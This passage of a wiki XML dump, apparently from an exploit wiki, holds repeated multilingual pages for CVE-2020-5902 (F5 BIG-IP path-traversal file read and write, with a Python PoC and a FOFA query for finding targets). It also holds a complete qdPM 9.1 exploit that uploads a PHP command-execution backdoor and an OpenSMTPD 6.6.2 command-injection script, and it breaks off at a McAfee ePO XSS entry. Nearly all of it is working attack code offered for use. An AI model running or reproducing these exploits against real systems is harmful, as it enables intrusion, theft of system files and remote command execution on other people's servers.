F5 BIG-IP 14.x: 14.1.2.6

F5 BIG-IP 13.x: 13.1.3.4

F5 BIG-IP 12.x: 12.1.5.2

F5 BIG-IP 11.x: 11.6.5.2


&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="BIG-IP&amp;reg ;- Redirect"
&lt;/pre&gt;

== ניצול ==
=== קרא את הקובץ ===
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
&lt;/pre&gt;

=== כתוב קובץ ===
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp

POST: fileName=/tmp/test.txt&amp;content=test
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: F5 BIG-IP                                                \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2020-5902.py                                  \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    version_url = target_url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=version_url, timeout=10, verify=False, headers=headers)
        if "output" in response.text:
            print("\033[32m[o] 目标 {} 存在漏洞，响应为:\n{}\033[0m".format(target_url, json.loads(response.text)["output"]))
        else:
            print("\033[31m[x] 目标漏洞无法利用 \033[0m")

    except Exception as e:
        print("\033[31m[x] 目标漏洞无法利用 ,{}\033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)

&lt;/pre&gt;

== הפניה ==
https://short.pwnwiki.org/?c=Kum2Ch</text>
      <sha1>3cvukjf62my7e58ytps4321h11mguh4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-5902 F5 BIG-IP 遠程代碼執行漏洞/pt</title>
    <ns>0</ns>
    <id>3850</id>
    <revision>
      <id>4461</id>
      <timestamp>2021-06-09T10:07:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Referência =="</comment>
      <origin>4461</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2517" sha1="8ko6nxroyt8k8zdc9pmoul0les9fdv9" xml:space="preserve">&lt;languages /&gt;

== Impacto de vulnerabilidade ==
&lt;pre&gt;
F5 BIG-IP 15.x: 15.1.0.4

F5 BIG-IP 14.x: 14.1.2.6

F5 BIG-IP 13.x: 13.1.3.4

F5 BIG-IP 12.x: 12.1.5.2

F5 BIG-IP 11.x: 11.6.5.2


&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="BIG-IP&amp;reg ;- Redirect"
&lt;/pre&gt;

== Exploit ==
=== Arquivo de leitura ===
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
&lt;/pre&gt;

=== Gravar arquivo ===
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp

POST: fileName=/tmp/test.txt&amp;content=test
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: F5 BIG-IP                                                \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2020-5902.py                                  \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    version_url = target_url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=version_url, timeout=10, verify=False, headers=headers)
        if "output" in response.text:
            print("\033[32m[o] 目标 {} 存在漏洞，响应为:\n{}\033[0m".format(target_url, json.loads(response.text)["output"]))
        else:
            print("\033[31m[x] 目标漏洞无法利用 \033[0m")

    except Exception as e:
        print("\033[31m[x] 目标漏洞无法利用 ,{}\033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)

&lt;/pre&gt;

== Referência ==
https://short.pwnwiki.org/?c=Kum2Ch</text>
      <sha1>8ko6nxroyt8k8zdc9pmoul0les9fdv9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-5902 F5 BIG-IP 遠程代碼執行漏洞/ru</title>
    <ns>0</ns>
    <id>3800</id>
    <revision>
      <id>4411</id>
      <timestamp>2021-06-09T09:53:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Ссылка =="</comment>
      <origin>4411</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2572" sha1="4q1u7fqypbjbuareslxapyhulodgjec" xml:space="preserve">&lt;languages /&gt;

== Воздействие уязвимости ==
&lt;pre&gt;
F5 BIG-IP 15.x: 15.1.0.4

F5 BIG-IP 14.x: 14.1.2.6

F5 BIG-IP 13.x: 13.1.3.4

F5 BIG-IP 12.x: 12.1.5.2

F5 BIG-IP 11.x: 11.6.5.2


&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="BIG-IP&amp;reg ;- Redirect"
&lt;/pre&gt;

== Эксплуатация ==
=== Прочитать файл ===
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
&lt;/pre&gt;

=== Записать файл ===
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp

POST: fileName=/tmp/test.txt&amp;content=test
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: F5 BIG-IP                                                \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2020-5902.py                                  \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    version_url = target_url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=version_url, timeout=10, verify=False, headers=headers)
        if "output" in response.text:
            print("\033[32m[o] 目标 {} 存在漏洞，响应为:\n{}\033[0m".format(target_url, json.loads(response.text)["output"]))
        else:
            print("\033[31m[x] 目标漏洞无法利用 \033[0m")

    except Exception as e:
        print("\033[31m[x] 目标漏洞无法利用 ,{}\033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)

&lt;/pre&gt;

== Ссылка ==
https://short.pwnwiki.org/?c=Kum2Ch</text>
      <sha1>4q1u7fqypbjbuareslxapyhulodgjec</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-5902 F5 BIG-IP 遠程代碼執行漏洞/uk</title>
    <ns>0</ns>
    <id>3801</id>
    <revision>
      <id>4412</id>
      <timestamp>2021-06-09T09:54:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "=== Записати файл ==="</comment>
      <origin>4412</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2566" sha1="i27ef7mfidb46d2qk4bb0zctuzwbrlj" xml:space="preserve">&lt;languages /&gt;

== Вплив вразливості ==
&lt;pre&gt;
F5 BIG-IP 15.x: 15.1.0.4

F5 BIG-IP 14.x: 14.1.2.6

F5 BIG-IP 13.x: 13.1.3.4

F5 BIG-IP 12.x: 12.1.5.2

F5 BIG-IP 11.x: 11.6.5.2


&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="BIG-IP&amp;reg ;- Redirect"
&lt;/pre&gt;

== Експлуатувати ==
=== Прочитати файл ===
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
&lt;/pre&gt;

=== Записати файл ===
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp

POST: fileName=/tmp/test.txt&amp;content=test
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: F5 BIG-IP                                                \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2020-5902.py                                  \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    version_url = target_url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=version_url, timeout=10, verify=False, headers=headers)
        if "output" in response.text:
            print("\033[32m[o] 目标 {} 存在漏洞，响应为:\n{}\033[0m".format(target_url, json.loads(response.text)["output"]))
        else:
            print("\033[31m[x] 目标漏洞无法利用 \033[0m")

    except Exception as e:
        print("\033[31m[x] 目标漏洞无法利用 ,{}\033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)

&lt;/pre&gt;

== Довідка ==
https://short.pwnwiki.org/?c=Kum2Ch</text>
      <sha1>i27ef7mfidb46d2qk4bb0zctuzwbrlj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-7246 qdPM 9.1 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>4500</id>
    <revision>
      <id>5178</id>
      <timestamp>2021-06-16T09:33:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt;  Version: &lt;=1.9.1 &lt;/pre&gt;  ==EXP== &lt;pre&gt; # Exploit Title: qdPM 9.1 - Remote Code Execution # Google Dork: intitle:..."</comment>
      <origin>5178</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4554" sha1="fq82q7xvzysddl8ti4zwx4tm34fzws0" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
 Version: &lt;=1.9.1
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: qdPM 9.1 - Remote Code Execution
# Google Dork: intitle:qdPM 9.1. Copyright © 2020 qdpm.net
# Date: 2020-01-22
# Exploit Author: Rishal Dwivedi (Loginsoft)
# Vendor Homepage: http://qdpm.net/
# Software Link: http://qdpm.net/download-qdpm-free-project-management
# Version: &lt;=1.9.1
# Tested on: Windows 10 (Python 2.7)
# CVE : CVE-2020-7246
# Exploit written in Python 2.7
# Tested Environment - Windows 10
# Path Traversal + Remote Code Execution

# Command - qdpm-exploit.py -url http://localhost/ -u user@localhost.com -p password
# -*- coding: utf-8 -*-
#!/usr/bin/python

import requests
from lxml import html
from argparse import ArgumentParser

session_requests = requests.session()

def multifrm(
   userid,
   username,
   csrftoken_,
   EMAIL,
   HOSTNAME,
   uservar,
   ):
   request_1 = {
       'sf_method': (None, 'put'),
       'users[id]': (None, userid[-1]),
       'users[photo_preview]': (None, uservar),
       'users[_csrf_token]': (None, csrftoken_[-1]),
       'users[name]': (None, username[-1]),
       'users[new_password]': (None, ''),
       'users[email]': (None, EMAIL),
       'extra_fields[9]': (None, ''),
       'users[remove_photo]': (None, '1'),
       }
   return request_1


def req(
   userid,
   username,
   csrftoken_,
   EMAIL,
   HOSTNAME,
   ):
   request_1 = multifrm(
       userid,
       username,
       csrftoken_,
       EMAIL,
       HOSTNAME,
       '.htaccess',
       )
   new = session_requests.post(HOSTNAME + 'index.php/myAccount/update'
                               , files=request_1)
   request_2 = multifrm(
       userid,
       username,
       csrftoken_,
       EMAIL,
       HOSTNAME,
       '../.htaccess',
       )
   new1 = session_requests.post(HOSTNAME + 'index.php/myAccount/update'
                                , files=request_2)
   request_3 = {
       'sf_method': (None, 'put'),
       'users[id]': (None, userid[-1]),
       'users[photo_preview]': (None, ''),
       'users[_csrf_token]': (None, csrftoken_[-1]),
       'users[name]': (None, username[-1]),
       'users[new_password]': (None, ''),
       'users[email]': (None, EMAIL),
       'extra_fields[9]': (None, ''),
       'users[photo]': ('backdoor.php',
                        '&lt;?php if(isset($_REQUEST[\'cmd\'])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;'
                        , 'application/octet-stream'),
       }
   upload_req = session_requests.post(HOSTNAME
           + 'index.php/myAccount/update', files=request_3)


def main(HOSTNAME, EMAIL, PASSWORD):
   result = session_requests.get(HOSTNAME + '/index.php/login')
   login_tree = html.fromstring(result.text)
   authenticity_token = \
       list(set(login_tree.xpath("//input[@name='login[_csrf_token]']/@value"
            )))[0]
   payload = {'login[email]': EMAIL, 'login[password]': PASSWORD,
              'login[_csrf_token]': authenticity_token}
   result = session_requests.post(HOSTNAME + '/index.php/login',
                                  data=payload,
                                  headers=dict(referer=HOSTNAME
                                  + '/index.php/login'))
   account_page = session_requests.get(HOSTNAME + 'index.php/myAccount'
           )
   account_tree = html.fromstring(account_page.content)
   userid = account_tree.xpath("//input[@name='users[id]']/@value")
   username = account_tree.xpath("//input[@name='users[name]']/@value")
   csrftoken_ = \
       account_tree.xpath("//input[@name='users[_csrf_token]']/@value")
   req(userid, username, csrftoken_, EMAIL, HOSTNAME)
   get_file = session_requests.get(HOSTNAME + 'index.php/myAccount')
   final_tree = html.fromstring(get_file.content)
   backdoor = \
       final_tree.xpath("//input[@name='users[photo_preview]']/@value")
   print 'Backdoor uploaded at - &gt; ' + HOSTNAME + '/uploads/users/' \
       + backdoor[-1] + '?cmd=whoami'


if __name__ == '__main__':
   parser = \
       ArgumentParser(description='qdmp - Path traversal + RCE Exploit'
                      )
   parser.add_argument('-url', '--host', dest='hostname',
                       help='Project URL')
   parser.add_argument('-u', '--email', dest='email',
                       help='User email (Any privilege account)')
   parser.add_argument('-p', '--password', dest='password',
                       help='User password')
   args = parser.parse_args()

   main(args.hostname, args.email, args.password)
&lt;/pre&gt;</text>
      <sha1>fq82q7xvzysddl8ti4zwx4tm34fzws0</sha1>
    </revision>
    <revision>
      <id>5179</id>
      <parentid>5178</parentid>
      <timestamp>2021-06-16T09:34:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5179</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4565" sha1="9r5c2az0f2ydo1k2p6ibl6tpp5ubi53" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
 Version: &lt;=1.9.1
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: qdPM 9.1 - Remote Code Execution
# Google Dork: intitle:qdPM 9.1. Copyright © 2020 qdpm.net
# Date: 2020-01-22
# Exploit Author: Rishal Dwivedi (Loginsoft)
# Vendor Homepage: http://qdpm.net/
# Software Link: http://qdpm.net/download-qdpm-free-project-management
# Version: &lt;=1.9.1
# Tested on: Windows 10 (Python 2.7)
# CVE : CVE-2020-7246
# Exploit written in Python 2.7
# Tested Environment - Windows 10
# Path Traversal + Remote Code Execution

# Command - qdpm-exploit.py -url http://localhost/ -u user@localhost.com -p password
# -*- coding: utf-8 -*-
#!/usr/bin/python

import requests
from lxml import html
from argparse import ArgumentParser

session_requests = requests.session()

def multifrm(
   userid,
   username,
   csrftoken_,
   EMAIL,
   HOSTNAME,
   uservar,
   ):
   request_1 = {
       'sf_method': (None, 'put'),
       'users[id]': (None, userid[-1]),
       'users[photo_preview]': (None, uservar),
       'users[_csrf_token]': (None, csrftoken_[-1]),
       'users[name]': (None, username[-1]),
       'users[new_password]': (None, ''),
       'users[email]': (None, EMAIL),
       'extra_fields[9]': (None, ''),
       'users[remove_photo]': (None, '1'),
       }
   return request_1


def req(
   userid,
   username,
   csrftoken_,
   EMAIL,
   HOSTNAME,
   ):
   request_1 = multifrm(
       userid,
       username,
       csrftoken_,
       EMAIL,
       HOSTNAME,
       '.htaccess',
       )
   new = session_requests.post(HOSTNAME + 'index.php/myAccount/update'
                               , files=request_1)
   request_2 = multifrm(
       userid,
       username,
       csrftoken_,
       EMAIL,
       HOSTNAME,
       '../.htaccess',
       )
   new1 = session_requests.post(HOSTNAME + 'index.php/myAccount/update'
                                , files=request_2)
   request_3 = {
       'sf_method': (None, 'put'),
       'users[id]': (None, userid[-1]),
       'users[photo_preview]': (None, ''),
       'users[_csrf_token]': (None, csrftoken_[-1]),
       'users[name]': (None, username[-1]),
       'users[new_password]': (None, ''),
       'users[email]': (None, EMAIL),
       'extra_fields[9]': (None, ''),
       'users[photo]': ('backdoor.php',
                        '&lt;?php if(isset($_REQUEST[\'cmd\'])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;'
                        , 'application/octet-stream'),
       }
   upload_req = session_requests.post(HOSTNAME
           + 'index.php/myAccount/update', files=request_3)


def main(HOSTNAME, EMAIL, PASSWORD):
   result = session_requests.get(HOSTNAME + '/index.php/login')
   login_tree = html.fromstring(result.text)
   authenticity_token = \
       list(set(login_tree.xpath("//input[@name='login[_csrf_token]']/@value"
            )))[0]
   payload = {'login[email]': EMAIL, 'login[password]': PASSWORD,
              'login[_csrf_token]': authenticity_token}
   result = session_requests.post(HOSTNAME + '/index.php/login',
                                  data=payload,
                                  headers=dict(referer=HOSTNAME
                                  + '/index.php/login'))
   account_page = session_requests.get(HOSTNAME + 'index.php/myAccount'
           )
   account_tree = html.fromstring(account_page.content)
   userid = account_tree.xpath("//input[@name='users[id]']/@value")
   username = account_tree.xpath("//input[@name='users[name]']/@value")
   csrftoken_ = \
       account_tree.xpath("//input[@name='users[_csrf_token]']/@value")
   req(userid, username, csrftoken_, EMAIL, HOSTNAME)
   get_file = session_requests.get(HOSTNAME + 'index.php/myAccount')
   final_tree = html.fromstring(get_file.content)
   backdoor = \
       final_tree.xpath("//input[@name='users[photo_preview]']/@value")
   print 'Backdoor uploaded at - &gt; ' + HOSTNAME + '/uploads/users/' \
       + backdoor[-1] + '?cmd=whoami'


if __name__ == '__main__':
   parser = \
       ArgumentParser(description='qdmp - Path traversal + RCE Exploit'
                      )
   parser.add_argument('-url', '--host', dest='hostname',
                       help='Project URL')
   parser.add_argument('-u', '--email', dest='email',
                       help='User email (Any privilege account)')
   parser.add_argument('-p', '--password', dest='password',
                       help='User password')
   args = parser.parse_args()

   main(args.hostname, args.email, args.password)
&lt;/pre&gt;</text>
      <sha1>9r5c2az0f2ydo1k2p6ibl6tpp5ubi53</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-7246 qdPM 9.1 遠程代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4505</id>
    <revision>
      <id>5184</id>
      <timestamp>2021-06-16T09:35:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-7246 qdPM 9.1 远程代码执行漏洞"</comment>
      <origin>5184</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4529" sha1="ea6l95fan2tfib2hmfq5z6bppx5mfco" xml:space="preserve">&lt;languages /&gt;
==影响版本==
&lt;pre&gt;
 Version: &lt;=1.9.1
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: qdPM 9.1 - Remote Code Execution
# Google Dork: intitle:qdPM 9.1. Copyright © 2020 qdpm.net
# Date: 2020-01-22
# Exploit Author: Rishal Dwivedi (Loginsoft)
# Vendor Homepage: http://qdpm.net/
# Software Link: http://qdpm.net/download-qdpm-free-project-management
# Version: &lt;=1.9.1
# Tested on: Windows 10 (Python 2.7)
# CVE : CVE-2020-7246
# Exploit written in Python 2.7
# Tested Environment - Windows 10
# Path Traversal + Remote Code Execution

# Command - qdpm-exploit.py -url http://localhost/ -u user@localhost.com -p password
# -*- coding: utf-8 -*-
#!/usr/bin/python

import requests
from lxml import html
from argparse import ArgumentParser

session_requests = requests.session()

def multifrm(
   userid,
   username,
   csrftoken_,
   EMAIL,
   HOSTNAME,
   uservar,
   ):
   request_1 = {
       'sf_method': (None, 'put'),
       'users[id]': (None, userid[-1]),
       'users[photo_preview]': (None, uservar),
       'users[_csrf_token]': (None, csrftoken_[-1]),
       'users[name]': (None, username[-1]),
       'users[new_password]': (None, ''),
       'users[email]': (None, EMAIL),
       'extra_fields[9]': (None, ''),
       'users[remove_photo]': (None, '1'),
       }
   return request_1


def req(
   userid,
   username,
   csrftoken_,
   EMAIL,
   HOSTNAME,
   ):
   request_1 = multifrm(
       userid,
       username,
       csrftoken_,
       EMAIL,
       HOSTNAME,
       '.htaccess',
       )
   new = session_requests.post(HOSTNAME + 'index.php/myAccount/update'
                               , files=request_1)
   request_2 = multifrm(
       userid,
       username,
       csrftoken_,
       EMAIL,
       HOSTNAME,
       '../.htaccess',
       )
   new1 = session_requests.post(HOSTNAME + 'index.php/myAccount/update'
                                , files=request_2)
   request_3 = {
       'sf_method': (None, 'put'),
       'users[id]': (None, userid[-1]),
       'users[photo_preview]': (None, ''),
       'users[_csrf_token]': (None, csrftoken_[-1]),
       'users[name]': (None, username[-1]),
       'users[new_password]': (None, ''),
       'users[email]': (None, EMAIL),
       'extra_fields[9]': (None, ''),
       'users[photo]': ('backdoor.php',
                        '&lt;?php if(isset($_REQUEST[\'cmd\'])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;'
                        , 'application/octet-stream'),
       }
   upload_req = session_requests.post(HOSTNAME
           + 'index.php/myAccount/update', files=request_3)


def main(HOSTNAME, EMAIL, PASSWORD):
   result = session_requests.get(HOSTNAME + '/index.php/login')
   login_tree = html.fromstring(result.text)
   authenticity_token = \
       list(set(login_tree.xpath("//input[@name='login[_csrf_token]']/@value"
            )))[0]
   payload = {'login[email]': EMAIL, 'login[password]': PASSWORD,
              'login[_csrf_token]': authenticity_token}
   result = session_requests.post(HOSTNAME + '/index.php/login',
                                  data=payload,
                                  headers=dict(referer=HOSTNAME
                                  + '/index.php/login'))
   account_page = session_requests.get(HOSTNAME + 'index.php/myAccount'
           )
   account_tree = html.fromstring(account_page.content)
   userid = account_tree.xpath("//input[@name='users[id]']/@value")
   username = account_tree.xpath("//input[@name='users[name]']/@value")
   csrftoken_ = \
       account_tree.xpath("//input[@name='users[_csrf_token]']/@value")
   req(userid, username, csrftoken_, EMAIL, HOSTNAME)
   get_file = session_requests.get(HOSTNAME + 'index.php/myAccount')
   final_tree = html.fromstring(get_file.content)
   backdoor = \
       final_tree.xpath("//input[@name='users[photo_preview]']/@value")
   print 'Backdoor uploaded at - &gt; ' + HOSTNAME + '/uploads/users/' \
       + backdoor[-1] + '?cmd=whoami'


if __name__ == '__main__':
   parser = \
       ArgumentParser(description='qdmp - Path traversal + RCE Exploit'
                      )
   parser.add_argument('-url', '--host', dest='hostname',
                       help='Project URL')
   parser.add_argument('-u', '--email', dest='email',
                       help='User email (Any privilege account)')
   parser.add_argument('-p', '--password', dest='password',
                       help='User password')
   args = parser.parse_args()

   main(args.hostname, args.email, args.password)
&lt;/pre&gt;</text>
      <sha1>ea6l95fan2tfib2hmfq5z6bppx5mfco</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-7247 OpenSMTPD 6.6.2 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1017</id>
    <revision>
      <id>1291</id>
      <timestamp>2021-04-09T02:46:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: OpenSMTPD 6.6.2 - Remote Code Execution # Date: 2020-01-29 # Exploit Author: 1F98D # Original Author: Qualys Security Advisory # Vendor Homepage..."</comment>
      <origin>1291</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1936" sha1="stfncsjgsnvlp30yl70e1m3oy5h488p" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: OpenSMTPD 6.6.2 - Remote Code Execution
# Date: 2020-01-29
# Exploit Author: 1F98D
# Original Author: Qualys Security Advisory
# Vendor Homepage: https://www.opensmtpd.org/
# Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1
# Version: OpenSMTPD &lt; 6.6.2
# Tested on: Debian 9.11 (x64)
# CVE: CVE-2020-7247
# References:
# https://www.openwall.com/lists/oss-security/2020/01/28/3
#
# OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately
# escape dangerous characters from user-controlled input. An attacker
# can exploit this to execute arbitrary shell commands on the target.
# 
#!/usr/local/bin/python3

from socket import *
import sys

if len(sys.argv) != 4:
    print('Usage {} &lt;target ip&gt; &lt;target port&gt; &lt;command&gt;'.format(sys.argv[0]))
    print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
    sys.exit(1)

ADDR = sys.argv[1]
PORT = int(sys.argv[2])
CMD = sys.argv[3]

s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDR, PORT))

res = s.recv(1024)
if 'OpenSMTPD' not in str(res):
    print('[!] No OpenSMTPD detected')
    print('[!] Received {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] OpenSMTPD detected')
s.send(b'HELO x\r\n')
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error connecting, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Connected, sending payload')
s.send(bytes('MAIL FROM:&lt;;{};&gt;\r\n'.format(CMD), 'utf-8'))
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error sending payload, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Payload sent')
s.send(b'RCPT TO:&lt;root&gt;\r\n')
s.recv(1024)
s.send(b'DATA\r\n')
s.recv(1024)
s.send(b'\r\nxxx\r\n.\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.recv(1024)
print('[*] Done')
&lt;/pre&gt;</text>
      <sha1>stfncsjgsnvlp30yl70e1m3oy5h488p</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-7318 McAfee ePolicy Orchestrator Reflected XSS</title>
    <ns>0</ns>
    <id>268</id>
    <revision>
      <id>416</id>
      <timestamp>2021-03-18T09:52:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; /PolicyMgmt/policyDetailsCard.do?poID=19&amp;typeID=3&amp;prodID=%27%22%3E%3Csvg%2fonload%3daIert(document.domain)%3E &lt;/pre&gt;"</comment>
      <origin>416</origin>
      <model>wikitext</model>
